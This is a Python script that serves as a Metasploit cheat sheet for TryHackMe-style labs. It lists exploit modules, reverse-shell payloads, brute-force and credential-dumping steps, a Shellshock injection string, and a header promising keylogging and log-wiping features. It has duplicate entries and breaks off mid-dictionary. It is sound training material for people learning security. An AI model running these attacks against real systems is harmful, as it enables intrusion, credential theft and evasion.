#!/usr/bin/env python3
"""
MSF-QUICK V5.0: Metasploit Quick Reference Tool
Created by: Zuciya Zaki (Dominic Metz)  
Purpose: Complete Metasploit + Meterpreter reference for TryHackMe domination
"I never go back on my word! That's my ninja way!" - Naruto

NEW IN V5.0:
- 🎮 Meterpreter Commands: Complete post-exploitation reference
- 🚩 Flag Hunting Workflow: Step-by-step guide to find flags
- 🔐 Credential Harvesting: hashdump, mimikatz, lsa_dump
- 👁️ Surveillance: Keylogger, screenshot, webcam
- 🎭 Stealth & Cleanup: migrate, clearev, timestomp
"""

import sys
import os

class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

def print_banner():
    banner = f"""{Colors.YELLOW}
╔══════════════════════════════════════════════════════════════════════╗   
║                                                                      ║
║                    ███████╗██╗   ██╗ ██████╗██╗██╗   ██╗ █████╗      ║
║                    ╚══███╔╝██║   ██║██╔════╝██║╚██╗ ██╔╝██╔══██╗     ║
║                      ███╔╝ ██║   ██║██║     ██║ ╚████╔╝ ███████║     ║
║                     ███╔╝  ██║   ██║██║     ██║  ╚██╔╝  ██╔══██║     ║
║                    ███████╗╚██████╔╝╚██████╗██║   ██║   ██║  ██║     ║
║                    ╚══════╝ ╚═════╝  ╚═════╝╚═╝   ╚═╝   ╚═╝  ╚═╝     ║
║                                                                      ║
║               ███████╗ █████╗ ██╗  ██╗██╗                            ║
║               ╚══███╔╝██╔══██╗██║ ██╔╝██║                            ║
║                 ███╔╝ ███████║█████╔╝ ██║                            ║
║                ███╔╝  ██╔══██║██╔═██╗ ██║                            ║
║               ███████╗██║  ██║██║  ██╗██║                            ║
║               ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝                            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║         METASPLOIT QUICK REFERENCE TOOL V5.0                         ║
║    🔍 Recon | 🔦 Auxiliary | 💥 Exploit | 🎮 Meterpreter            ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

EXPLOITS = {
    'ms17_010': {
        'name': 'MS17-010 EternalBlue',
        'path': 'exploit/windows/smb/ms17_010_eternalblue',
        'rank': '★★★★★ EXCELLENT',
        'port': '445/tcp',
        'target': 'Windows 7/8/2008/2012/2016',
        'cve': 'CVE-2017-0144',
        'description': 'NSA exploit leaked by Shadow Brokers, used in WannaCry ransomware',
        'payload': 'windows/x64/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'When you find SMB port 445 open on older Windows - instant SYSTEM shell',
        'prerequisites': 'None - works unauthenticated (this is why it\'s legendary!)',
        'recon_first': 'nmap -p445 --script smb-vuln-ms17-010 <target>',
        'success_looks_like': 'Meterpreter session opens - you see "meterpreter >" prompt',
        'after_shell': 'getuid (should show NT AUTHORITY\\SYSTEM), hashdump, search -f flag.txt',
        'troubleshooting': 'If exploit completes but no session: check LHOST is tun0, verify target vulnerable',
        'notes': 'Most famous exploit ever - try this FIRST on Windows + SMB!'
    },
    'psexec': {
        'name': 'PSExec Authentication',
        'path': 'exploit/windows/smb/psexec',
        'rank': '★★★★☆ GREAT',
        'port': '445/tcp',
        'target': 'Windows (with valid credentials)',
        'cve': 'N/A',
        'description': 'Execute commands via SMB with stolen/cracked credentials',
        'payload': 'windows/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'After cracking passwords - use credentials for shell access',
        'prerequisites': 'Valid username AND password/hash',
        'recon_first': 'crackmapexec smb <target> -u username -p password',
        'after_shell': 'getuid, if not SYSTEM try: getsystem, search -f flag.txt',
        'notes': 'Requires valid creds. Use after hashdump or brute force'
    },
    'samba_usermap': {
        'name': 'Samba Usermap Script',
        'path': 'exploit/multi/samba/usermap_script',
        'rank': '★★★★★ EXCELLENT',
        'port': '139/445',
        'target': 'Samba 3.0.20 - 3.0.25rc3',
        'cve': 'CVE-2007-2447',
        'description': 'Command injection in username → instant root shell',
        'payload': 'cmd/unix/reverse',
        'category': 'linux',
        'purpose': 'Easiest Linux root shell! Very common in TryHackMe',
        'prerequisites': 'None',
        'recon_first': 'nmap -sV -p445 <target> | grep -i samba',
        'after_shell': 'whoami → find / -name flag.txt 2>/dev/null',
        'notes': 'One of THE easiest Linux exploits. Check Samba version!'
    },
    'distcc': {
        'name': 'DistCC Daemon RCE',
        'path': 'exploit/unix/misc/distcc_exec',
        'rank': '★★★★★ EXCELLENT',
        'port': '3632/tcp',
        'target': 'DistCC daemon',
        'description': 'Remote code execution on compilation daemon',
        'payload': 'cmd/unix/reverse',
        'category': 'linux',
        'purpose': 'When port 3632 open - developer compilation service vulnerable',
        'notes': 'Common on older Linux boxes'
    },
    'vsftpd_234': {
        'name': 'VSFTPD 2.3.4 Backdoor',
        'path': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'rank': '★★★★★ EXCELLENT',
        'port': '21/tcp',
        'target': 'VSFTPD 2.3.4',
        'description': 'Smiley face :) in username triggers root shell',
        'payload': 'cmd/unix/interact',
        'category': 'linux',
        'purpose': 'Easiest FTP backdoor ever - instant root!',
        'recon_first': 'nc <target> 21 → check banner for "vsFTPd 2.3.4"',
        'after_shell': 'whoami → find / -name "*flag*" 2>/dev/null',
        'notes': 'SUPER common in labs! Metasploitable 2 classic'
    },
    'unreal_ircd': {
        'name': 'UnrealIRCd Backdoor',
        'path': 'exploit/unix/irc/unreal_ircd_3281_backdoor',
        'rank': '★★★★★ EXCELLENT',
        'port': '6667/tcp',
        'target': 'UnrealIRCd 3.2.8.1',
        'description': 'Backdoor in IRC daemon source code',
        'payload': 'cmd/unix/reverse',
        'category': 'linux',
        'purpose': 'IRC server with intentional backdoor - instant shell',
        'recon_first': 'nmap -sV -p6667 <target>',
        'after_shell': 'whoami → find / -name "*.txt" 2>/dev/null | grep flag',
        'notes': 'Famous backdoor - check IRC port 6667'
    },
    'libssh_auth_bypass': {
        'name': 'Libssh Authentication Bypass',
        'path': 'exploit/linux/ssh/libssh_auth_bypass',
        'rank': '★★★★★ EXCELLENT',
        'port': '22/tcp',
        'target': 'Libssh 0.6.0 - 0.8.3',
        'cve': 'CVE-2018-10933',
        'description': 'Bypass SSH authentication completely - no password needed!',
        'payload': 'linux/x64/meterpreter/reverse_tcp',
        'category': 'linux',
        'purpose': 'Port 22 SSH with vulnerable Libssh - instant access without credentials',
        'prerequisites': 'None - works unauthenticated (authentication bypass!)',
        'recon_first': 'nmap -sV -p22 <target> | grep -i libssh',
        'success_looks_like': 'Shell session opens without asking for password',
        'after_shell': 'whoami → find / -name flag.txt 2>/dev/null',
        'troubleshooting': 'Only works on Libssh library (not OpenSSH). Check version carefully',
        'notes': 'RARE but GOLD when found! Bypasses auth entirely. Common in older CTF boxes'
    },
    'proftpd_backdoor': {
        'name': 'ProFTPD 1.3.3c Backdoor',
        'path': 'exploit/unix/ftp/proftpd_133c_backdoor',
        'rank': '★★★★★ EXCELLENT',
        'port': '21/tcp',
        'target': 'ProFTPD 1.3.3c',
        'cve': 'N/A (backdoor)',
        'description': 'Backdoor in ProFTPD source code - instant root shell',
        'payload': 'cmd/unix/reverse',
        'category': 'linux',
        'purpose': 'ProFTPD with backdoor - root shell without authentication!',
        'prerequisites': 'None',
        'recon_first': 'nc <target> 21 → check banner for "ProFTPD 1.3.3c"',
        'after_shell': 'whoami → should be root! → find / -name "*flag*" 2>/dev/null',
        'troubleshooting': 'Make sure version is EXACTLY 1.3.3c - other versions not vulnerable',
        'notes': 'Similar to vsftpd backdoor. Very common in TryHackMe and HTB!'
    },
    'shellshock': {
        'name': 'Shellshock - Apache mod_cgi',
        'path': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/443',
        'target': 'Apache with CGI enabled (bash < 4.3)',
        'cve': 'CVE-2014-6271',
        'description': 'Bash vulnerability via HTTP headers - command injection',
        'payload': 'linux/x86/meterpreter/reverse_tcp',
        'category': 'linux',
        'purpose': 'Web server with CGI scripts - exploit bash vulnerability for shell',
        'prerequisites': 'Apache with CGI enabled, vulnerable bash version',
        'recon_first': 'gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x sh,cgi',
        'success_looks_like': 'Meterpreter session opens from web server',
        'after_shell': 'getuid → search -f flag.txt',
        'troubleshooting': 'Need to find CGI path (usually /cgi-bin/). Set TARGETURI to script path',
        'notes': 'FAMOUS vulnerability! Look for .cgi or .sh files. Try /cgi-bin/status, /cgi-bin/test.cgi'
    },
    'rejetto_hfs': {
        'name': 'Rejetto HTTP File Server RCE',
        'path': 'exploit/windows/http/rejetto_hfs_exec',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/tcp',
        'target': 'Rejetto HFS 2.3.x',
        'cve': 'CVE-2014-6287',
        'description': 'Remote command execution in HTTP File Server',
        'payload': 'windows/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'HFS web server - instant Windows shell!',
        'prerequisites': 'None',
        'recon_first': 'nmap -sV -p80 <target> → curl http://<target> | grep -i "HttpFileServer"',
        'success_looks_like': 'Meterpreter session on Windows system',
        'after_shell': 'getuid → search -f flag.txt',
        'troubleshooting': 'Check HFS version in web page footer. Must be 2.3.x',
        'notes': 'SUPER COMMON in TryHackMe! Easy Windows exploit. Check port 80 carefully!'
    },
    'ms08_067': {
        'name': 'MS08-067 NetAPI',
        'path': 'exploit/windows/smb/ms08_067_netapi',
        'rank': '★★★★★ EXCELLENT',
        'port': '445/tcp',
        'target': 'Windows XP/2003/Vista/2008',
        'cve': 'CVE-2008-4250',
        'description': 'Windows NetAPI vulnerability - SYSTEM shell instantly',
        'payload': 'windows/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'Older Windows SMB - the exploit BEFORE EternalBlue!',
        'prerequisites': 'None',
        'recon_first': 'nmap -p445 --script smb-vuln-ms08-067 <target>',
        'success_looks_like': 'Meterpreter session as NT AUTHORITY\\SYSTEM',
        'after_shell': 'getuid → hashdump → search -f flag.txt',
        'troubleshooting': 'Try different targets (set TARGET 0-7). Windows XP usually TARGET 0',
        'notes': 'Legendary old exploit! Used in Conficker worm. Try if EternalBlue fails on old Windows'
    },
    'drupalgeddon2': {
        'name': 'Drupalgeddon2 - Drupal RCE',
        'path': 'exploit/unix/webapp/drupal_drupalgeddon2',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/443',
        'target': 'Drupal 7.x / 8.x (before patches)',
        'cve': 'CVE-2018-7600',
        'description': 'Drupal CMS remote code execution - no auth needed',
        'payload': 'php/meterpreter/reverse_tcp',
        'category': 'web',
        'purpose': 'Drupal website - instant shell on web server!',
        'prerequisites': 'None',
        'recon_first': 'curl http://<target>/CHANGELOG.txt | head -n 5 → check Drupal version',
        'success_looks_like': 'Shell session on web server (usually www-data)',
        'after_shell': 'whoami → find / -name flag.txt 2>/dev/null → check /var/www/html',
        'troubleshooting': 'Set TARGETURI to / (root). Check if Drupal is installed at subdirectory',
        'notes': 'MAJOR Drupal vulnerability! Very common in CTFs. Check CHANGELOG.txt for version'
    },
    'slmail_pop3': {
        'name': 'SLMail POP3 Buffer Overflow',
        'path': 'exploit/windows/pop3/seattlelab_pass',
        'rank': '★★★★☆ GREAT',
        'port': '110/tcp',
        'target': 'SLMail 5.5',
        'cve': 'CVE-2003-0264',
        'description': 'Classic buffer overflow in POP3 service',
        'payload': 'windows/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'Learning buffer overflows - classic OSCP-style exploit',
        'prerequisites': 'None',
        'recon_first': 'nc <target> 110 → check banner for "SLMail"',
        'success_looks_like': 'Meterpreter session after sending overflow',
        'after_shell': 'getuid → search -f flag.txt',
        'troubleshooting': 'May need to set TARGET for different Windows versions',
        'notes': 'Famous for OSCP practice! Classic stack buffer overflow example'
    },
    'tomcat_mgr': {
        'name': 'Tomcat Manager Upload',
        'path': 'exploit/multi/http/tomcat_mgr_upload',
        'rank': '★★★★★ EXCELLENT',
        'port': '8080/tcp',
        'target': 'Apache Tomcat (with credentials)',
        'description': 'Upload malicious WAR file via manager interface',
        'payload': 'java/meterpreter/reverse_tcp',
        'category': 'web',
        'purpose': 'When /manager/html accessible - upload WAR for shell',
        'recon_first': 'curl http://<target>:8080/manager/html -u tomcat:tomcat',
        'after_shell': 'getuid → find / -name "*flag*" 2>/dev/null',
        'notes': 'Default creds: tomcat/tomcat, admin/admin'
    },
    'struts2_rce': {
        'name': 'Apache Struts2 RCE (Equifax!)',
        'path': 'exploit/multi/http/struts2_content_type_ognl',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/443',
        'target': 'Apache Struts 2.3.5-2.3.31, 2.5-2.5.10',
        'description': 'RCE via Content-Type header. THE Equifax breach!',
        'payload': 'linux/x64/meterpreter/reverse_tcp',
        'category': 'web',
        'purpose': 'Java web app using Struts2 - exploit Content-Type',
        'notes': '$700M+ breach exploit! Check Struts version'
    },
    'drupal_drupalgeddon': {
        'name': 'Drupalgeddon 2',
        'path': 'exploit/unix/webapp/drupal_drupalgeddon2',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/443',
        'target': 'Drupal 7.x, 8.x',
        'description': 'Pre-auth RCE in Drupal CMS',
        'payload': 'php/meterpreter/reverse_tcp',
        'category': 'web',
        'purpose': 'Drupal CMS - no authentication needed for RCE',
        'recon_first': 'curl http://<target>/CHANGELOG.txt | head',
        'after_shell': 'whoami → find /var/www -name "*flag*"',
        'notes': 'Very common! Drupal < 7.58, 8.x < 8.3.9'
    },
    'shellshock': {
        'name': 'Shellshock (Bash)',
        'path': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/443',
        'target': 'Apache with mod_cgi + Bash',
        'description': 'RCE via Bash environment variable parsing',
        'payload': 'linux/x86/meterpreter/reverse_tcp',
        'category': 'linux',
        'purpose': 'Apache running CGI scripts - exploit Bash vulnerability',
        'recon_first': 'curl -A "() { :; }; echo vulnerable" http://<target>/cgi-bin/test.cgi',
        'after_shell': 'whoami → find / -name "*flag*" 2>/dev/null',
        'notes': 'CVE-2014-6271 - Test with () { :; } in User-Agent'
    },
    'proftpd': {
        'name': 'ProFTPD 1.3.3c Backdoor',
        'path': 'exploit/unix/ftp/proftpd_133c_backdoor',
        'rank': '★★★★★ EXCELLENT',
        'port': '21/tcp',
        'target': 'ProFTPD 1.3.3c',
        'description': 'Backdoor in FTP server',
        'payload': 'cmd/unix/reverse',
        'category': 'linux',
        'purpose': 'ProFTPD 1.3.3c exactly - backdoored version',
        'notes': 'Check ProFTPD version carefully'
    },
    'webmin': {
        'name': 'Webmin Backdoor',
        'path': 'exploit/unix/webapp/webmin_backdoor',
        'rank': '★★★★★ EXCELLENT',
        'port': '10000/tcp',
        'target': 'Webmin 1.890-1.920',
        'description': 'Backdoor in Webmin package',
        'payload': 'cmd/unix/reverse',
        'category': 'linux',
        'purpose': 'Port 10000 showing Webmin 1.890-1.920 - backdoored',
        'notes': 'Web-based system administration tool'
    },
    'rejetto_hfs': {
        'name': 'Rejetto HFS RCE',
        'path': 'exploit/windows/http/rejetto_hfs_exec',
        'rank': '★★★★★ EXCELLENT',
        'port': '80/tcp',
        'target': 'Rejetto HTTP File Server 2.3',
        'description': 'Remote code execution via scripting',
        'payload': 'windows/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'Web server "HFS 2.3" - simple file server with RCE',
        'recon_first': 'curl -I http://<target> | grep Server',
        'after_shell': 'getuid → search -f flag.txt -d C:\\',
        'notes': 'Simple HTTP file server with RCE vulnerability'
    },
    'shell_to_meterpreter': {
        'name': 'Upgrade Shell to Meterpreter',
        'path': 'post/multi/manage/shell_to_meterpreter',
        'rank': '★★★★★ EXCELLENT',
        'port': 'N/A (post-exploitation)',
        'target': 'Any platform (Windows/Linux/Mac)',
        'cve': 'N/A (legitimate tool)',
        'description': 'Upgrades a basic command shell session to a full Meterpreter session',
        'payload': 'Depends on target OS (auto-selected)',
        'category': 'post-exploitation',
        'purpose': 'When you have a basic shell and want Meterpreter power - upgrade it!',
        'prerequisites': 'Existing shell session (from any exploit)',
        'recon_first': 'sessions -l (list all sessions, identify shell session number)',
        'success_looks_like': 'New Meterpreter session created, upgraded from shell',
        'after_shell': 'Use new Meterpreter session: sessions -i <new_session_number>',
        'troubleshooting': 'If fails: Check LHOST is correct, verify target can reach you, try different LPORT',
        'notes': 'CRITICAL for CTFs! Turns weak shell into powerful Meterpreter. Run this IMMEDIATELY after getting shell!'
    },
    'hashdump': {
        'name': 'Windows Hash Dump',
        'path': 'post/windows/gather/hashdump',
        'rank': '★★★★★ EXCELLENT',
        'port': 'N/A (post-exploitation)',
        'target': 'Windows (any version)',
        'cve': 'N/A (post-exploitation)',
        'description': 'Dumps password hashes from Windows SAM database',
        'payload': 'N/A (post-exploitation)',
        'category': 'post-exploitation',
        'purpose': 'After getting SYSTEM/Admin - dump all password hashes for cracking!',
        'prerequisites': 'Meterpreter session with SYSTEM or Administrator privileges',
        'recon_first': 'getuid (verify you have SYSTEM or Administrator), getsystem if needed',
        'success_looks_like': 'Displays username:RID:LM_hash:NTLM_hash for all users',
        'after_shell': 'Copy hashes → Use john-quick tool → Crack with john --format=NT',
        'troubleshooting': 'If fails: run getsystem first, verify you have admin rights with getuid',
        'notes': 'USE THIS EVERY TIME you get SYSTEM! Essential for gathering credentials. Output format: user:RID:LM:NTLM'
    },
     'local_exploit_suggester': {
        'name': 'Local Exploit Suggester',
        'path': 'post/multi/recon/local_exploit_suggester',
        'rank': '★★★★★ EXCELLENT',
        'port': 'N/A (post-exploitation)',
        'target': 'Windows/Linux/Mac (any OS)',
        'cve': 'N/A (reconnaissance)',
        'description': 'Automatically suggests privilege escalation exploits for the target',
        'payload': 'N/A (post-exploitation)',
        'category': 'post-exploitation',
        'purpose': 'After getting shell - find privilege escalation paths automatically!',
        'prerequisites': 'Any Meterpreter session (even low-privilege works!)',
        'recon_first': 'sysinfo (check OS and patch level)',
        'success_looks_like': 'Lists exploits that might work for privilege escalation',
        'after_shell': 'Try suggested exploits: use exploit/windows/local/[suggested], set SESSION X, run',
        'troubleshooting': 'Takes 1-2 minutes to scan, be patient! If no suggestions = system is patched',
        'notes': 'GOLD! Run this immediately after getting any shell. Saves hours of manual research!'
    },
    'smb_login': {
        'name': 'SMB Login Scanner/Brute Force',
        'path': 'auxiliary/scanner/smb/smb_login',
        'rank': '★★★★☆ GREAT',
        'port': '445/tcp',
        'target': 'Windows SMB',
        'cve': 'N/A (authentication scanner)',
        'description': 'Tests credentials against SMB service, can brute force',
        'payload': 'N/A (auxiliary)',
        'category': 'recon',
        'purpose': 'Test username/password combos against SMB - find valid credentials!',
        'prerequisites': 'SMB port 445 open, list of usernames/passwords',
        'recon_first': 'nmap -p445 <target> (verify SMB open)',
        'success_looks_like': 'Shows [+] Success for valid credentials, [+] Admin access if admin!',
        'after_shell': 'Use valid credentials with psexec exploit for shell access!',
        'troubleshooting': 'Set USER_FILE and PASS_FILE for wordlists, or USERPASS_FILE for combo list',
        'notes': 'Very common in THM! Test default creds: admin/admin, administrator/password, guest/guest'
    },
    'pwnkit': {
        'name': 'PwnKit - Linux Privilege Escalation',
        'path': 'exploit/linux/local/cve_2021_4034_pwnkit',
        'rank': '★★★★★ EXCELLENT',
        'port': 'N/A (local exploit)',
        'target': 'Linux with polkit (most distros 2009-2021)',
        'cve': 'CVE-2021-4034',
        'description': 'Privilege escalation to root via polkit pkexec vulnerability',
        'payload': 'linux/x64/meterpreter/reverse_tcp',
        'category': 'linux',
        'purpose': 'When you have low-privilege Linux shell - escalate to root!',
        'prerequisites': 'Existing Meterpreter or shell session (any user, even low-priv)',
        'recon_first': 'which pkexec (verify pkexec is present), cat /etc/os-release (check Linux version)',
        'success_looks_like': 'New session opens with uid=0 (root) privileges',
        'after_shell': 'whoami → should show root! Then: cat /root/root.txt for flag',
        'troubleshooting': 'If fails: target may be patched, try other local exploits from suggester',
        'notes': 'MAJOR vulnerability! Affects Ubuntu, Debian, Red Hat, Fedora from 2009-2021. Very common in THM!'
    },
    'bypassuac_eventvwr': {
        'name': 'Windows UAC Bypass - Event Viewer',
        'path': 'exploit/windows/local/bypassuac_eventvwr',
        'rank': '★★★★★ EXCELLENT',
        'port': 'N/A (local exploit)',
        'target': 'Windows 7/8/10 (unpatched)',
        'cve': 'N/A (UAC bypass technique)',
        'description': 'Bypass Windows User Account Control to get elevated privileges',
        'payload': 'windows/x64/meterpreter/reverse_tcp',
        'category': 'windows',
        'purpose': 'When you have regular user access - bypass UAC to get admin!',
        'prerequisites': 'Meterpreter session as regular user (medium integrity)',
        'recon_first': 'getuid (check current user), shell → whoami /groups (check UAC level)',
        'success_looks_like': 'New elevated session opens, getprivs shows more privileges',
        'after_shell': 'getsystem → hashdump → dump all passwords!',
        'troubleshooting': 'If fails: User must be in Administrators group, try other UAC bypass modules',
        'notes': 'UAC = User Account Control. This bypasses the popup! Works even if UAC is enabled.'
    }
}

AUXILIARY = {
    'scanners': [
        {
            'name': 'TCP Port Scanner',
            'path': 'auxiliary/scanner/portscan/tcp',
            'purpose': 'Fast TCP port scanning when nmap not available or blocked',
            'use_case': 'Initial reconnaissance - find open ports',
            'common_options': 'RHOSTS, PORTS, THREADS',
            'example': 'set RHOSTS 10.10.x.x\nset PORTS 1-1000\nrun',
            'notes': 'Faster than nmap for quick scans. Good for large ranges'
        },
        {
            'name': 'SMB Version Scanner',
            'path': 'auxiliary/scanner/smb/smb_version',
            'purpose': 'Detect SMB version to select appropriate exploit',
            'use_case': 'After finding port 445 - identify Windows version',
            'common_options': 'RHOSTS',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Essential! Tells you if MS17-010 or other SMB exploits apply'
        },
        {
            'name': 'HTTP Version Scanner',
            'path': 'auxiliary/scanner/http/http_version',
            'purpose': 'Identify web server type and version',
            'use_case': 'Web reconnaissance - find Apache/IIS/nginx versions',
            'common_options': 'RHOSTS, RPORT',
            'example': 'set RHOSTS 10.10.x.x\nset RPORT 80\nrun',
            'notes': 'Helps select web exploits (Struts, Tomcat, etc.)'
        },
        {
            'name': 'SSH Version Scanner',
            'path': 'auxiliary/scanner/ssh/ssh_version',
            'purpose': 'Detect SSH server version',
            'use_case': 'Find SSH version for exploit selection',
            'common_options': 'RHOSTS',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Check for vulnerable SSH versions'
        },
        {
            'name': 'FTP Version Scanner',
            'path': 'auxiliary/scanner/ftp/ftp_version',
            'purpose': 'Identify FTP server type and version',
            'use_case': 'Check if vsftpd 2.3.4 or ProFTPD vulnerable version',
            'common_options': 'RHOSTS',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Look for vsftpd 2.3.4 or ProFTPD 1.3.3c'
        }
    ],
    'enumeration': [
        {
            'name': 'SMB Share Enumeration',
            'path': 'auxiliary/scanner/smb/smb_enumshares',
            'purpose': 'List accessible SMB shares on Windows systems',
            'use_case': 'After finding SMB - discover shared folders',
            'common_options': 'RHOSTS, SMBUser, SMBPass',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Find hidden shares, look for sensitive files. Try without creds first!'
        },
        {
            'name': 'SMB User Enumeration',
            'path': 'auxiliary/scanner/smb/smb_enumusers',
            'purpose': 'Enumerate Windows user accounts via SMB',
            'use_case': 'Build username list for brute force attacks',
            'common_options': 'RHOSTS',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Get usernames before password attacks. Common in CTF'
        },
        {
            'name': 'SSH Username Enumeration',
            'path': 'auxiliary/scanner/ssh/ssh_enumusers',
            'purpose': 'Enumerate valid usernames via SSH timing attack',
            'use_case': 'Find valid SSH users before brute forcing',
            'common_options': 'RHOSTS, USER_FILE',
            'example': 'set RHOSTS 10.10.x.x\nset USER_FILE /usr/share/wordlists/metasploit/unix_users.txt\nrun',
            'notes': 'Works on OpenSSH < 7.7. Build user list for ssh_login'
        },
        {
            'name': 'HTTP Directory Scanner',
            'path': 'auxiliary/scanner/http/dir_scanner',
            'purpose': 'Find hidden directories and files on web server',
            'use_case': 'Web reconnaissance - discover admin panels, uploads',
            'common_options': 'RHOSTS, DICTIONARY',
            'example': 'set RHOSTS 10.10.x.x\nset DICTIONARY /usr/share/wordlists/dirb/common.txt\nrun',
            'notes': 'Like dirb/gobuster. Find /admin, /uploads, /backup'
        },
        {
            'name': 'FTP Anonymous Login Check',
            'path': 'auxiliary/scanner/ftp/anonymous',
            'purpose': 'Test for anonymous FTP access',
            'use_case': 'Check if FTP allows anonymous:anonymous login',
            'common_options': 'RHOSTS',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Common misconfiguration! May find sensitive files'
        },
        {
            'name': 'MySQL Version Scanner',
            'path': 'auxiliary/scanner/mysql/mysql_version',
            'purpose': 'Detect MySQL version and configuration',
            'use_case': 'Database reconnaissance',
            'common_options': 'RHOSTS',
            'example': 'set RHOSTS 10.10.x.x\nrun',
            'notes': 'Find database version for exploit selection'
        }
    ],
    'brute_force': [
        {
            'name': 'SSH Brute Force Login',
            'path': 'auxiliary/scanner/ssh/ssh_login',
            'purpose': 'Brute force SSH credentials',
            'use_case': 'After username enum - crack SSH passwords',
            'common_options': 'RHOSTS, USER_FILE, PASS_FILE, THREADS',
            'example': 'set RHOSTS 10.10.x.x\nset USER_FILE users.txt\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nset THREADS 10\nrun',
            'notes': 'SLOW! Use username list first. Watch for account lockouts'
        },
        {
            'name': 'SMB Login Brute Force',
            'path': 'auxiliary/scanner/smb/smb_login',
            'purpose': 'Brute force Windows SMB/CIFS credentials',
            'use_case': 'Crack Windows domain or local passwords',
            'common_options': 'RHOSTS, SMBUser, SMBPass, USER_FILE, PASS_FILE',
            'example': 'set RHOSTS 10.10.x.x\nset USER_FILE users.txt\nset PASS_FILE passwords.txt\nrun',
            'notes': 'Try common passwords first: admin/admin, Administrator/password'
        },
        {
            'name': 'FTP Login Brute Force',
            'path': 'auxiliary/scanner/ftp/ftp_login',
            'purpose': 'Brute force FTP credentials',
            'use_case': 'Crack FTP passwords after anonymous fails',
            'common_options': 'RHOSTS, USER_FILE, PASS_FILE',
            'example': 'set RHOSTS 10.10.x.x\nset USERNAME admin\nset PASS_FILE passwords.txt\nrun',
            'notes': 'Try common FTP creds: admin/admin, ftp/ftp'
        },
        {
            'name': 'MySQL Login Brute Force',
            'path': 'auxiliary/scanner/mysql/mysql_login',
            'purpose': 'Brute force MySQL database credentials',
            'use_case': 'Crack database passwords',
            'common_options': 'RHOSTS, USERNAME, PASS_FILE',
            'example': 'set RHOSTS 10.10.x.x\nset USERNAME root\nset PASS_FILE passwords.txt\nrun',
            'notes': 'Try root with common passwords first'
        },
        {
            'name': 'HTTP Form Brute Force',
            'path': 'auxiliary/scanner/http/http_login',
            'purpose': 'Brute force web application login forms',
            'use_case': 'Crack web admin panel passwords',
            'common_options': 'RHOSTS, TARGETURI, USERNAME, PASS_FILE',
            'example': 'set RHOSTS 10.10.x.x\nset TARGETURI /admin\nset USERNAME admin\nset PASS_FILE passwords.txt\nrun',
            'notes': 'For basic auth. Use Burp for complex forms'
        }
    ],
    'gathering': [
        {
            'name': 'MySQL Hash Dump',
            'path': 'auxiliary/scanner/mysql/mysql_hashdump',
            'purpose': 'Extract MySQL user password hashes',
            'use_case': 'After getting MySQL creds - dump hashes for cracking',
            'common_options': 'RHOSTS, USERNAME, PASSWORD',
            'example': 'set RHOSTS 10.10.x.x\nset USERNAME root\nset PASSWORD password\nrun',
            'notes': 'Requires valid MySQL credentials. Crack hashes with John'
        },
        {
            'name': 'Windows Gather Credentials',
            'path': 'auxiliary/gather/credentials/windows/credentials_collector',
            'purpose': 'Collect stored credentials from Windows',
            'use_case': 'Post-exploitation - steal saved passwords',
            'common_options': 'SESSION',
            'example': 'set SESSION 1\nrun',
            'notes': 'Run after getting Meterpreter session. Finds browser passwords, etc.'
        },
        {
            'name': 'Windows Autologin Credentials',
            'path': 'auxiliary/gather/credentials/windows_autologin',
            'purpose': 'Extract Windows autologin credentials from registry',
            'use_case': 'Post-exploitation - find cleartext passwords',
            'common_options': 'SESSION',
            'example': 'set SESSION 1\nrun',
            'notes': 'Searches registry for stored login credentials'
        },
        {
            'name': 'Linux Gather History',
            'path': 'auxiliary/gather/linux_bash_history',
            'purpose': 'Extract bash command history',
            'use_case': 'Post-exploitation - find passwords in command history',
            'common_options': 'SESSION',
            'example': 'set SESSION 1\nrun',
            'notes': 'Users often type passwords in commands. GOLDMINE!'
        }
    ]
}

METERPRETER_COMMANDS = {
    'recon': [
        {'cmd': 'getuid', 'desc': 'Show current user and privilege level', 'example': 'getuid', 'output': 'Server username: NT AUTHORITY\\SYSTEM'},
        {'cmd': 'sysinfo', 'desc': 'Display system information (OS, arch, hostname)', 'example': 'sysinfo', 'output': 'Computer: VICTIM-PC, OS: Windows 7, Arch: x64'},
        {'cmd': 'getpid', 'desc': 'Get current process ID', 'example': 'getpid', 'output': 'Current pid: 1337'},
        {'cmd': 'ps', 'desc': 'List running processes', 'example': 'ps', 'output': 'PID   Name          User'},
        {'cmd': 'ipconfig', 'desc': 'Show network interface configuration', 'example': 'ipconfig', 'output': 'Interface 1: 192.168.1.100'},
    ],
    'files': [
        {'cmd': 'ls', 'desc': 'List directory contents', 'example': 'ls', 'output': 'Listing: C:\\Users\\...'},
